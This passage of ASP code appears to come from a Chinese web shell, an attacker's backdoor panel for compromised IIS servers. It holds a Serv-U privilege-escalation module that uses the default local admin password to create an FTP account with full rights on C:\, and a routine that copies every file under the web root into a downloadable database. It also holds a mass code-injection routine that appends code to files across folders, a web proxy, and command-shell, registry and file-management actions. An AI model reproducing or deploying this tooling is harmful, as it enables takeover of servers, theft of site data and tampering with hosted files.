set conn = server.createobject("adodb.connection")
conn.open "provider=microsoft.jet.oledb.4.0; data source=" & dbfile
sql="create table [" & sqltable &"](" & mdbcreate &")"
conn.execute(sql)
conn.close
set conn=nothing
end function
function copysq(mdbname,sqltable,sqlpwd,sqlusername,sqldataname,sqldatasource,mdbinsert,sqlselect,mdbsql) 
mdbarray=split(mdbinsert,"|") 
max=ubound(mdbarray) 
dbfile=server.mappath(mdbname)  
set conn = server.createobject("adodb.connection")  
conn.open "provider=microsoft.jet.oledb.4.0; data source=" & dbfile  
set rs = createobject("adodb.recordset")
rs.open "["& sqltable &"]", conn, 1, 3  
if mdbsql="sql" then 
set connstr=server.createobject("adodb.connection")
connstr.open  "provider=sqloledb.1;password="&sqlpwd&";user id="&sqlusername&";database="&sqldataname&";data source ="&sqldatasource 
elseif mdbsql="mdb" then 
filepath1=server.mappath(sqldataname) 
set connstr=server.createobject("adodb.connection")
connstr.open  "provider=microsoft.jet.oledb.4.0;data source=" & filepath1 
end if 
sql1="select "& sqlselect &" from ["& sqltable &"] "& tiaojian &" " 
set showbbs=connstr.execute(sql1) 
do while not showbbs.eof 
rs.addnew 
for i=0 to max 
rs(mdbarray(i))=showbbs(mdbarray(i)) 
next 
rs.update  
showbbs.movenext 
loop 
showbbs.close 
set showbbs=nothing 
if err.number=0 then  
response.write dbfile & " <center>数据复制成功</center>，　"  
response.write "<a href="& mdbname &"><center>下载</center></a>"
else  
response.write "<center>失败，原因： " & err.description  
response.end 
end if 
end function
case "webproxy"
response.write("<form name='form1' method='post' action='?action=webproxy'>")
response.write("<div style='background:red'>")
response.write("<center><p><strong>地址：</strong>")
if request.form("a")="" then
response.write("<input name='a' type='text' class='unnamed1' id='a' value='http://'>")
else
response.write("<input name='a' type='text' class='unnamed1' id='a' value='http://'>")
end if
response.write("<label>")
response.write("<select name='yy' class='input'>")
response.write("<option value='gb2312' selected>简体中文</option>")
response.write("<option value='big5'>繁体中文</option>")
response.write("<option value='Shift-jIS'>日文</option>")
response.write("<option value='UTF-8'>UTF-8</option>")
response.write("<option value='windows'>西欧默认</option>")
response.write("<option value='ISO'>西欧Iso</option>")
response.write("</select></label>")
response.write("<center><input name='Submit' type='submit' class='unnamed1' value='提交'>")
response.write("<font color='blue' size='6'> 落叶纷飞 </font>修改</p></form></div></center>")
if request.form("a")<>"" or request("a")<>"" then
Function getHTTPPage(url)
dim http
set http=Server.createobject("Microsoft.XMLHTTP")
Http.open "GET",url,false
Http.send()
On Error Resume Next
If Http.Status<>200 then
exit function
end if
getHTTPPage=bytesToBSTR(Http.responseBody,request.form("yy"))
set http=nothing
if err.number<>0 then err.Clear 
End function
Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Function Newstring(wstr,strng)
Newstring=Instr(wstr,strng)
End Function
wstr=getHTTPPage( request.form("a") )
if int(len(wstr))>1000 then
start=newstring(wstr,"")
over=newstring(wstr,"")
'wstr=replace(wstr,"src=""/","src=""")
response.write wstr
else
response.write "<center>错误,可能是字符超出了范围，为了节省资源被End了，也可能是您访问的资源有问题</center>"
'response.write len(wstr)
end if
response.write("<div style='background:#FFFF66'>")
response.write("<form name='form1' method='post' action='?action=webproxy'>")
response.write("<p><strong><font color=red>地址：</font></strong>")
response.write("<input name='a' type='text' class='unnamed1' id='a' value='http://'>")
response.write("<label><select name='yy' class='input'>")
response.write("<option value='gb2312' selected>简体中文</option>")
response.write("<option value='big5'>繁体中文</option>")
response.write("<option value='Shift-jIS'>日文</option>")
response.write("<option value='UTF-8'>UTF-8</option>")
response.write("<option value='windows'>西欧默认</option>")
response.write("<option value='ISO'>西欧Iso</option>")
response.write("</select></label>")
response.write("<input name='Submit' type='submit' class='unnamed1' value='提交'>")
response.write("<font color='#990000' size='6'> <a href='http://leaves.cnsst.org'>落叶纷飞</a> </font><font color=red>修改</font></p></form></div>")
else
end if
Case "leaves"
RRS"<p><center>Serv-U T权程序asp v1.0 增强版----by  落叶纷飞</p>"
RRS"<form name='form1' method='post' action=''>"
RRS"<center>管理员:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
RRS"<center>管理员密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
RRS"<center>SERV-U端口:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
RRS"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='luoye'><br>"
RRS"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='cnsst'><br>"
RRS"<center>帐号的所对的路径:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>"
RRS"<center>服务端口:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>"
RRS"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加"
RRS"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除"
RRS"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
'leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=cctv|0.0.0.0|43859|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
'leaves = leaves & "quit" & vbcrlf




'--------
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
response.write ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else

leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf

Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
response.write "<font color=red>I l0v4 5cr1pt~~~~``</font><br><BR>"
end if
case "xcmd5"
RRS"<iframe src=http://www.cmd5.com width=1100 height=400></iframe><p></p><iframe src=http://www.xmd5.org width=1100 height=400></iframe>"
case "otools"
RRS"<iframe src=http://www.cha88.cn width=1100 height=800></iframe>"
case "backuu"
dim dbfile,fso,sql
mdbfile="crab.mdb"
dbfile=server.MapPath(mdbfile)
Set FSO = CreateObject("Scripting.FileSystemObject")
if fso.FileExists(dbfile) then
fso.DeleteFile(dbfile)
end if
set fso=nothing
set cat=server.CreateObject("ADOX.Catalog")
cat.Create "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbfile
set cat=nothing
if err.number=0 then
Response.Write "数据库 " & dbfile & " 创建成功<br> "
else
Response.Write "数据库创建失败，原因： " & err.description
Response.End
end if
Set Conn = Server.CreateObject("ADODB.Connection")
Conn.Open "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & dbfile
sql="CREATE TABLE filedata([id] counter PRIMARY KEY,[path] Memo,[file] General)"
conn.execute(sql)
Set rs = CreateObject("ADODB.RecordSet")
rs.Open "FileData", conn, 1, 3
set obj=server.createobject("scripting.filesystemobject")
set objfolder=obj.getfolder(server.mappath("/"))
search objfolder
response.write("打完，收工回家睡觉！")
function search(objfolder)
dim objsubfolder
for each objfile in objfolder.files
Set objStream = Server.CreateObject("ADODB.Stream")
a=a+1
objStream.Type = 1
objStream.Open
response.write a &"<br>"
response.write objfile.path &"<br>"
if right(objfile.path,len(mdbfile))=mdbfile or right(objfile.path,4)=".ldb" then
else
objStream.LoadFromFile objfile.path
rs.addnew
rs("file")=objstream.read
rs("Path")=right(objfile.path,len(objfile.path)-3)
rs.update
objStream.close
end if
next
for each objsubfolder in objfolder.subfolders
search objsubfolder
next
end Function
Sub InsertAllFiles(Wpath,Wcode,pc)
Server.ScriptTimeout=999999999
if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
Set WFSO = CreateObject("Scripting.FileSystemObject")
on error resume next 
Set f = WFSO.GetFolder(Wpath)
Set fc2 = f.files
For Each myfile in fc2
Set FS1 = CreateObject("Scripting.FileSystemObject")
FType1=split(myfile.name,".") 
FType2=ubound(FType1) 
if Ftype2>0 then
FType3=LCase(FType1(FType2)) 
else
FType3="无"
end if
if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
select case M
case "1"
if checkbox<>"checked" then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"√ "&Wpath&myfile.name
tfile.close
else
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
if Instr(tfile1.readall,Wcode)=0 then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"√  "&Wpath&myfile.name
tfile1.close
else
RRS"<font color=red>×</font> "&Wpath&myfile.name
tfile1.close
end if
Set tfile1=Nothing
end if
case "2"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,"")
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"√  "&Wpath&myfile.name
Set objCountFile=Nothing
case "3"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,addCode2)
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"√  "&Wpath&myfile.name
Set objCountFile=Nothing
case else
RRS"大哥,别乱来.":response.end
end select
else
RRS"× "&Wpath&myfile.name
end if
RrS" → <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RrS"<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RrS"<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> "
RrS"<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RrS"<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a><br>"
Next
Set fsubfolers = f.SubFolders
For Each f1 in fsubfolers
NewPath=Wpath&""&f1.name
InsertAllFiles NewPath,Wcode,pc
Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub
Case "ReadREG":call ReadREG()
Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
Case "DownFile":DownFile FName:ShowErr()
Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
Case "UpFile":UpFile()
Case "Cmd1Shell":Cmd1Shell()
Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL
Case "CreateMdb":CreateMdb FName
Case "CompactMdb":CompactMdb FName
Case "DbManager":DbManager()
Case "Course":Course()
Case "ServerInfo":ServerInfo()
Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
RRS"</body></html>"
%>
